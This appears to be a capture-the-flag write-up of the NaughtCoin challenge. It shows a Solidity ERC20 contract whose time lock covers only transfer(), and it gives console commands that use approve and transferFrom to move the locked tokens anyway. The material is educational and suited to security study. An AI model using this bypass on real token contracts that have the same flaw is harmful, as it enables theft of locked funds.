# Understanding Blockchain Security: Inheriting Contracts and Ensuring Complete Security

In the realm of blockchain security, it's crucial to grasp how inheriting contracts impacts security measures. Let's delve into a scenario where we inherit contracts and explore additional measures to ensure complete security.

### The Challenge: Bypassing Time Lock Criteria in Token Transfer

Consider a scenario where a contract, named `NaughtCoin`, inherits from the ERC20 token standard. The primary feature of interest here is a time lock mechanism that prevents depositors from withdrawing their tokens before a specified time period elapses. The challenge is to bypass this time lock criteria and transfer tokens without adhering to the predetermined waiting period.

    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
    
    contract NaughtCoin is ERC20 {
      
      uint public timeLock = block.timestamp + 10 * 365 days;
      uint256 public INITIAL_SUPPLY;
      address public player;
    
      constructor(address _player) ERC20('NaughtCoin', '0x0') {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
      }
      
      function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
        super.transfer(_to, _value);
      }
    
      // Prevent the initial owner from transferring tokens until the timelock has passed
      modifier lockTokens() {
        if (msg.sender == player) {
          require(block.timestamp > timeLock);
          _;
        } else {
         _;
        }
      } 
    }
    
### Exploiting ERC20 Token Standard for Transfer
The ERC20 token standard allows for token transfers on behalf of others after receiving approval. Leveraging this feature, we can execute a workaround to bypass the time lock criteria. By approving ourselves to transfer tokens and utilizing the transferFrom function, we can execute token transfers without restriction.

Here's how to execute the exploit:

1. Approve yourself to transfer tokens:

    ```javascript
    await contract.approve(player, "1000000000000000000000000");

3. Execute the transfer using transferFrom:

    ```javascript
    contract.transferFrom(player, player, "1000000000000000000000000");
    
Upon successful execution, the balance of the player will reflect the transferred amount, effectively bypassing the time lock criteria.

    ```javascript
    (await contract.balanceOf(player)).toString()
    
### Conclusion
Understanding the intricacies of inheriting contracts and exploiting token standards like ERC20 is paramount in ensuring blockchain security. By recognizing vulnerabilities and implementing appropriate measures, developers can fortify their contracts against potential exploits, safeguarding user assets and maintaining trust within the ecosystem.
